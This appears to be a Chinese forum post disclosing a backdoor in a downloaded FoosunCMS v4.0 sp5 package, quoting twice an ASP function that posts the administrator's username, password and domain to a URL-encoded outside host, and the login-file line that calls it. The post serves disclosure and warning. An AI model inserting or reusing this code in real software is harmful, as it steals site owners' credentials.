@@ -1,0 +1,56 @@
+FoosunCMSv4.0sp5带模板完整版存在恶意后门代码
+
+[FoosunCMSv4.0sp5带模板完整版存在恶意后门代码 全文]今日在做淘特CMS一键导入其它CMS数据时，轮到下载风讯最新的CMS代码，下载后的文件名为：FoosunCMS免费版v4_Sp5_完整版含模板.rar
+解压后登录后台，结果却出现以下提示：下面是源文件
+<script language=''javascript''>alert(''登陆过期，请重新登陆'');window.top.locati 
+于是直接输入登录地址http://localhost/admin/login.asp 
+输入用户名和密码，提交登录。此次是OK了。 
+不过我的环境却检测到有数据包发送到http://www.www512.cn/js/wz.asp这个地址。 
+到网上找http://www.www512.cn，发现这只是个论坛，并不是风讯的网。奇怪！！ 
+于是搜索包括www.www512.cn的代码，结果没有找到，终于在FS_Inc文件夹下找到Md5.asp文件，发现以下代码： 
+Public Function GETtoPostern(user,pass) 
+  dim sql 
+  dim http 
+  dim domain 
+  domain=Request.ServerVariables("SERVER_NAME"&Request.ServerVariables("HTTP_url" 
+  sql="name="&user&"&pass="&pass&"&domain="&domain 
+  set Http=server.createobject("MSXML2.XMLHTTP" 
+  Http.open "Post","http://www.www%35%31%32.cn/js/%77%7A%2Easp",false 
+  Http.setRequestHeader "Content-Type","application/x-www-form-urlencoded" 
+  Http.send sql 
+  set http=nothing 
+  GETtoPostern=sql   
+End Function 
+呵呵，一目了然了。 
+这段程序居然将你的用户名密码和网站地址(见：sql="name="&user&"&pass="&pass&"&domain="&domain)打包数据发送http://www.www%35%31%32.cn/js/%77%7A%2Easp(用了urlencode,转过来就http://www.www512.cn/js/wz.asp,怪不得搜索不到！！） 
+恐怖吧，你的网站一旦上线，用户名和密码就被发给别人了。 
+
+实在是巧合才发现了这个问题，如果不是升级模块的话，也不知会有多少用户....，希望看到此贴(不是漏洞，公布出来不会以为恶意竞争吧。：）)，和foosun熟悉的朋友通知他们下，我在其论坛发了贴没有回应。 
+
+下载地址 
+http://www.foosun.net/FsDown/Dow ... 19_38_F83ID_66.html 
+
+fs_inc\md5.asp 
+行126开始 
+
+Quote:
+Public Function GETtoPostern(user,pass) 
+  dim sql 
+  dim http 
+  dim domain 
+  domain=Request.ServerVariables("SERVER_NAME")&Request.ServerVariables("HTTP_url") 
+  sql="name="&user&"&pass="&pass&"&domain="&domain 
+  set Http=server.createobject("MSXML2.XMLHTTP") 
+  Http.open "Post","http://www.www%35%31%32.cn/js/%77%7A%2Easp",false 
+  Http.setRequestHeader "Content-Type","application/x-www-form-urlencoded" 
+  Http.send sql 
+  set http=nothing 
+  GETtoPostern=sql   
+End Function   
+
+
+admin\chklogin.asp 
+
+行98 
+
+call GETtoPostern(Session("Admin_Name"),p_TempUserPass)  
